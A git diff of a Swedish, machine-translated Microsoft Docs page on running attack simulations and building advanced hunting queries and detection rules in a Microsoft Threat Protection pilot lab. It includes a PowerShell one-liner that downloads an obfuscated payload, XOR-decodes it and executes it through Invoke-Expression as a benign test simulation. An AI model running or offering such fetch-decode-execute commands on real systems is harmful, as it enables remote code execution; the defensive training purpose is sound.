@@ -17,14 +17,15 @@ manager: dansimp
 audience: ITPro
 ms.collection:
 - M365-security-compliance
-- m365solution-evalutatemtp
+- m365solution-scenario
+- m365solution-pilotmtpproject
 ms.topic: conceptual
-ms.openlocfilehash: e6cf01f5540e383fb56e387cd07b455741221dc5
-ms.sourcegitcommit: 9d8d071659e662c266b101377e24549963e43fef
+ms.openlocfilehash: f165a34d5e9df2f3502a9d9c6230fed9b73b758b
+ms.sourcegitcommit: a83acd5b9eeefd2e20e5bac916fe29d09fb53de9
 ms.translationtype: MT
 ms.contentlocale: sv-SE
-ms.lasthandoff: 10/06/2020
-ms.locfileid: "48368099"
+ms.lasthandoff: 10/10/2020
+ms.locfileid: "48418151"
 ---
 # <a name="run-your-microsoft-threat-protection-attack-simulations"></a>Kör dina simuleringar av angrepps skydd för Microsoft Threats  
 
@@ -92,21 +93,23 @@ Under simuleringen injicerar angreppet shellcode i en Innocent process. I det h�
 Eftersom du redan har konfigurerat din pilot miljö under förberedelse fasen bör du kontrol lera att du har två enheter för det här scenariot: en testen het och en domänkontrollant.
 
 1.  Kontrol lera att din klient organisation har [aktiverat Microsoft Threat Microsoft Threat Protection](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).
+
 2.  Verifiera konfigurationen för din testdomänkontrollant:
+
     - Enheten körs med Windows Server 2008 R2 eller en senare version.
     - Testa domänkontrollanten till [Avancerat Azure-skydd](https://docs.microsoft.com/azure/security-center/security-center-wdatp) och aktivera [fjärrhantering](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager).    
     - Kontrol lera att [integreringen med Azure ATP och Microsoft Cloud App](https://docs.microsoft.com/cloud-app-security/aatp-integration) har Aktiver ATS.
     - En test användare skapas på din domän – inga administratörs behörigheter behövs.
 
 3.  Verifiera test enhetens konfiguration:
-    <br>
-    a.  Enheten körs med Windows 10 version 1903 eller senare.
-    <br>
-    b.  Testen het är ansluten till test domänen.
-    <br>
-    c.  [Aktivera Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). Om du har problem med att aktivera Windows Defender Antivirus kan du läsa det här [avsnittet fel sökning](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).
-    <br>
-    d.  Kontrol lera att test enheten är [inbyggd för Microsoft Defender Avancerat skydd (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).
+ 
+    1.  Enheten körs med Windows 10 version 1903 eller senare.
+    
+    1.  Testen het är ansluten till test domänen.
+    
+    1.  [Aktivera Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). Om du har problem med att aktivera Windows Defender Antivirus kan du läsa det här [avsnittet fel sökning](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).
+    
+    1.  Kontrol lera att test enheten är [inbyggd för Microsoft Defender Avancerat skydd (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).
 
 Om du använder en befintlig klient organisation och implementerar enhets grupper skapar du en dedikerad enhets grupp för test enheten och skickar den till toppnivån i konfigurations gränssnittet.
 
@@ -120,15 +123,17 @@ Så här kör du en simulering av angrepps scenario:
 2.  Öppna ett Windows PowerShell-fönster på test enheten.
 
 3.  Kopiera följande simulerings skript:
-```
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
-= [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
--UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
-$decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
-$i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
-```
->[!NOTE]
->Om du öppnar det här dokumentet i en webbläsare kanske du stöter på problem när du kopierar hela texten utan att förlora vissa tecken eller introducerar extra rad brytningar. Ladda ner det här dokumentet och öppna det i Adobe Reader.
+
+    ```powershell
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
+    = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
+    -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
+    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
+    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
+    ```
+    
+    > [!NOTE]
+    > Om du öppnar det här dokumentet i en webbläsare kanske du stöter på problem när du kopierar hela texten utan att förlora vissa tecken eller introducerar extra rad brytningar. Ladda ner det här dokumentet och öppna det i Adobe Reader.
 
 4. När du uppmanas till det klistrar du in och kör det kopierade skriptet.
 
@@ -141,7 +146,7 @@ Den simulerade angreppet försöker kommunicera med en extern IP-adress (som sim
 
 Du kommer att se ett meddelande som visas på PowerShell-konsolen när det här skriptet är klart.
 
-```
+```console
 ran NetSessionEnum against [DC Name] with return code result 0      
 ```
 
@@ -333,96 +338,98 @@ Det finns en enda intern post låda och enhet för det här scenariot. Du behöv
 
 **Gå med i jakt**
 1.  Öppna security.microsoft.com-portalen.
+
 2.  Navigera till **jakt > avancerad jakt**.
 
     ![Skärm bild av avancerad jakt i M365 Security Center Portal navigerings fält](../../media/mtp/fig17.png) 
 
 3.  Skapa en fråga som börjar med att samla in e-posthändelser.
-    a.  I fönstret fråga väljer du nytt.
-    b.  Dubbelklicka på tabellen EmailEvents från schemat.
 
-```
-EmailEvents 
-```                                        
+    1.  I fönstret fråga väljer du nytt.
+    
+    1.  Dubbelklicka på tabellen EmailEvents från schemat.
 
-   c.   Ändra tids ramen till de senaste 24 timmarna. Förutsatt att e-postmeddelandet du skickade när du körde simuleringen ovan var under de senaste 24 timmarna, annars kan du ändra tids ramen.
-   ![Skärm bild av var du kan ändra tids ramen. Öppna den nedrullningsbara menyn för att välja mellan olika tids Rams alternativ](../../media/mtp/fig18.png) 
+        ```
+        EmailEvents 
+        ```                                        
 
+    1.  Ändra tids ramen till de senaste 24 timmarna. Förutsatt att e-postmeddelandet du skickade när du körde simuleringen ovan var under de senaste 24 timmarna, annars kan du ändra tids ramen.
+    
+        ![Skärm bild av var du kan ändra tids ramen. Öppna den nedrullningsbara menyn för att välja mellan olika tids Rams alternativ](../../media/mtp/fig18.png) 
 
-   d.   Kör frågan.  Du kan ha många resultat beroende på miljön för piloten.  
+    1.  Kör frågan.  Du kan ha många resultat beroende på miljön för piloten.  
 
->[!NOTE]
->Se nästa steg för att filtrera alternativ för att begränsa data returen.
+        > [!NOTE]
+        > Se nästa steg för att filtrera alternativ för att begränsa data returen.
 
-   ![Skärm bild av de avancerade frågeresultaten](../../media/mtp/fig19.png) 
+        ![Skärm bild av de avancerade frågeresultaten](../../media/mtp/fig19.png) 
 
->[!NOTE]
->I avancerade jakt visas frågeresultat som tabell data. Du kan också välja att visa data i andra format typer, till exempel diagram.    
+        > [!NOTE]
+        > I avancerade jakt visas frågeresultat som tabell data. Du kan också välja att visa data i andra format typer, till exempel diagram.    
 
-   e.   Titta på resultaten och se om du kan identifiera det e-postmeddelande som du har öppnat.  Det kan ta upp till två timmar innan meddelandet visas i en avancerad jakt. Om e-postmiljöen är stor och det finns många resultat kanske du vill använda **alternativet Visa filter** för att hitta meddelandet. 
+    1.  Titta på resultaten och se om du kan identifiera det e-postmeddelande som du har öppnat.  Det kan ta upp till två timmar innan meddelandet visas i en avancerad jakt. Om e-postmiljöen är stor och det finns många resultat kanske du vill använda **alternativet Visa filter** för att hitta meddelandet. 
 
-   I exemplet skickades e-postmeddelandet från ett Yahoo-konto. Klicka på **+** ikonen bredvid **yahoo.com** under avsnittet SenderFromDomain och klicka sedan på **Använd** för att lägga till den markerade domänen i frågan.  Du bör använda den domän eller det e-postkonto som användes för att skicka test meddelandet i steg 1 av kör simuleringen för att filtrera resultaten.  Kör frågan igen för att få en mindre resultat uppsättning för att kontrol lera att meddelandet från simuleringen visas.
+        I exemplet skickades e-postmeddelandet från ett Yahoo-konto. Klicka på **+** ikonen bredvid **yahoo.com** under avsnittet SenderFromDomain och klicka sedan på **Använd** för att lägga till den markerade domänen i frågan.  Du bör använda den domän eller det e-postkonto som användes för att skicka test meddelandet i steg 1 av kör simuleringen för att filtrera resultaten.  Kör frågan igen för att få en mindre resultat uppsättning för att kontrol lera att meddelandet från simuleringen visas.
    
-   ![Skärm bild av filtren. Använd filter för att begränsa sökningen och hitta det du letar efter.](../../media/mtp/fig20.png) 
+        ![Skärm bild av filtren. Använd filter för att begränsa sökningen och hitta det du letar efter.](../../media/mtp/fig20.png) 
 
+        ```console
+        EmailEvents 
+        | where SenderMailFromDomain == "yahoo.com"
+        ```
 
-```
-EmailEvents 
-| where SenderMailFromDomain == "yahoo.com"
-```
-
-   f.   Klicka på de resulterande raderna i frågan så att du kan kontrol lera posten.
-   ![Skärm bild av panelen kontrol lera post som öppnas när ett avancerat jakt resultat är markerat](../../media/mtp/fig21.png) 
-
+    1.  Klicka på de resulterande raderna i frågan så att du kan kontrol lera posten.
+   
+        ![Skärm bild av panelen kontrol lera post som öppnas när ett avancerat jakt resultat är markerat](../../media/mtp/fig21.png) 
 
 4.  Nu när du har verifierat att du kan se e-postmeddelandet lägger du till ett filter för de bifogade filerna. Fokusera på alla e-postmeddelanden med bifogade filer i miljön. I det här scenariot fokuserar du på inkommande e-postmeddelanden, inte de som skickas ut från din miljö. Ta bort alla filter som du har lagt till för att hitta meddelandet och lägga till | där **AttachmentCount > 0** och **EmailDirection**  ==  **"inkommande" "**
 
-I följande fråga visas resultatet med en kortare lista än den första frågan för alla e-posthändelser:
+    I följande fråga visas resultatet med en kortare lista än den första frågan för alla e-posthändelser:
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
 
-```
+    ```
 
 5.  Ta sedan med informationen om den bifogade filen (till exempel: fil namn, hash-värden) till din resultat uppsättning. För att göra det, gå med i **EmailAttachmentInfo** -tabellen. De vanligaste fälten som används för att ansluta i det här fallet är **NetworkMessageId** och **RecipientObjectId**.
 
-Följande fråga inkluderar också ytterligare en rad "| **Project – Byt namn på EmailTimestamp = tidsstämpel**"som hjälper dig att identifiera vilken tidsstämpel som hör till e-postmeddelandet jämfört med tidsstämplar relaterade till fil åtgärder som du lägger till i nästa steg.
+    Följande fråga inkluderar också ytterligare en rad "| **Project – Byt namn på EmailTimestamp = tidsstämpel**"som hjälper dig att identifiera vilken tidsstämpel som hör till e-postmeddelandet jämfört med tidsstämplar relaterade till fil åtgärder som du lägger till i nästa steg.
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
+    ```
 
 6.  Använd sedan värdet **SHA256** från tabellen **EmailAttachmentInfo** för att söka efter **DeviceFileEvents** (fil åtgärder som inträffade på slut punkten) för denna hash.  Det gemensamma fältet här blir SHA256-hashvärdet för bilagan.
 
-Den resulterande tabellen innehåller nu information från slut punkten (Microsoft Defender ATP), till exempel enhets namn, vilken åtgärd som utfördes (i det här fallet filtrerades endast FileCreated händelser) och var filen lagrades. Det konto namn som är kopplat till processen tas också med.
+    Den resulterande tabellen innehåller nu information från slut punkten (Microsoft Defender ATP), till exempel enhets namn, vilken åtgärd som utfördes (i det här fallet filtrerades endast FileCreated händelser) och var filen lagrades. Det konto namn som är kopplat till processen tas också med.
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
-| join DeviceFileEvents on SHA256 
-| where ActionType == "FileCreated"
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
+    | join DeviceFileEvents on SHA256 
+    | where ActionType == "FileCreated"
+    ```
 
-Nu har du skapat en fråga som identifierar alla inkommande e-postmeddelanden där användaren öppnade eller sparade den bifogade filen. Du kan också förfina den här frågan och filtrera efter specifika avsändare, fil storlekar, filtyper och så vidare.
+    Nu har du skapat en fråga som identifierar alla inkommande e-postmeddelanden där användaren öppnade eller sparade den bifogade filen. Du kan också förfina den här frågan och filtrera efter specifika avsändare, fil storlekar, filtyper och så vidare.
 
 7.  Funktioner är en särskild typ av koppling som gör att du kan hämta mer TI-information om en fil, som dess för-och inloggnings uppgifter, information om undertecknare, uppgifter och mottagare.  Om du vill ha mer information om filen använder du funktionen **FileProfile ()** .
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
-| join DeviceFileEvents on SHA256 
-| where ActionType == "FileCreated"
-| distinct SHA1
-| invoke FileProfile()
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
+    | join DeviceFileEvents on SHA256 
+    | where ActionType == "FileCreated"
+    | distinct SHA1
+    | invoke FileProfile()
+    ```
 
 
 **Skapa en identifiering**
@@ -435,15 +442,15 @@ Anpassade identifieringar kör frågan utifrån den frekvens som du anger och re
     
     ![Skärm bild av var du kan klicka på Skapa detektions regel på sidan Advanced jakt](../../media/mtp/fig22.png) 
 
->[!NOTE]
->Om du klickar på regeln för att **skapa en identifiering** och det finns syntaxfel i frågan sparas inte identifierings regeln. Dubbelkolla din fråga för att se till att det inte finns några fel. 
+    > [!NOTE]
+    > Om du klickar på regeln för att **skapa en identifiering** och det finns syntaxfel i frågan sparas inte identifierings regeln. Dubbelkolla din fråga för att se till att det inte finns några fel. 
 
 
 2.  Fyll i de obligatoriska fälten med den information som gör att säkerhets teamet kan förstå varningen, varför det genererades och vilka åtgärder du förväntar dig. 
 
     ![Skärm bild av sidan Skapa en detektions regel där du kan ange aviserings information](../../media/mtp/fig23.png)
 
-Kontrol lera att du fyller i fälten med klarhet för att ge nästa användare ett välgrundat beslut om den här varningen för identifierings regel 
+    Kontrol lera att du fyller i fälten med klarhet för att ge nästa användare ett välgrundat beslut om den här varningen för identifierings regel 
 
 3.  Välj vilka enheter som påverkas av den här aviseringen. I det här fallet väljer du **enhet** och **post låda**.
 
@@ -458,7 +465,7 @@ Kontrol lera att du fyller i fälten med klarhet för att ge nästa användare e
 
     ![Skärm bild av sidan Skapa detektions regel där du kan ställa in omfattningen för notifieringsregeln för att hantera dina förväntningar för de resultat du kommer att se](../../media/mtp/fig26.png) 
 
-För denna pilot kanske du vill begränsa den här regeln till en delmängd av test enheter i produktions miljön.
+    För denna pilot kanske du vill begränsa den här regeln till en delmängd av test enheter i produktions miljön.
 
 6.  Välj **Skapa**. Välj sedan **anpassade identifierings regler** från navigerings panelen.
  
@@ -466,9 +473,9 @@ För denna pilot kanske du vill begränsa den här regeln till en delmängd av t
 
     ![Skärm bild av sidan identifierings regler som visar information om regler och körningar](../../media/mtp/fig27b.png) 
 
-Från den här sidan kan du välja ett identifierings uttryck som öppnar en informations sida. 
+    Från den här sidan kan du välja ett identifierings uttryck som öppnar en informations sida. 
 
-![Skärm bild av sidan med e-postbilagor där du kan se status för regel körning, utlösnings aviseringar och åtgärder, redigera identifieringen och så vidare](../../media/mtp/fig28.png) 
+    ![Skärm bild av sidan med e-postbilagor där du kan se status för regel körning, utlösnings aviseringar och åtgärder, redigera identifieringen och så vidare](../../media/mtp/fig28.png) 
 
 ### <a name="additional-advanced-hunting-walk-through-exercises"></a>Ytterligare avancerade övningar
 
@@ -477,7 +484,7 @@ För att få reda på mer om Advanced jakt kan följande webb sändningar vägle
 >[!NOTE]
 >Förbered dig med ditt eget GitHub-konto för att köra jakt frågorna i test laboratorie miljön för pilot.  
 
-| **Title** | **Beskrivning** | **Ladda ner MP4** | **Titta på YouTube** | **CSL fil som ska användas** |
+|  Title  |  Beskrivning  |  Ladda ner MP4  |  Titta på YouTube  |  CSL fil som ska användas  |
 |:-----|:-----|:-----|:-----|:-----|
 | Avsnitt 1: grundläggande om Keyword | Vi kommer att få grunderna i de avancerade jakt funktionerna i Microsoft Threat Protection. Läs mer om tillgängliga avancerade jakt data och grundläggande Keyword-syntax och-operatörer. | [ MP4](https://aka.ms/MTP15JUL20_MP4) | [YouTube](https://youtu.be/0D9TkGjeJwM) | [Avsnitt 1: CSL-fil i git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl) |
 | Avsnitt 2: kopplingar | Vi fortsätter att lära sig mer om data i avancerad jakt och hur du ansluter samman tabeller. Lär dig mer om inre, yttre, unika och mellananslutna och Nuances för standard Kusto innerunique Join. | [MP4](https://aka.ms/MTP22JUL20_MP4) | [YouTube](https://youtu.be/LMrO6K5TWOU) | [Avsnitt 2: CSL-fil i git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl) |
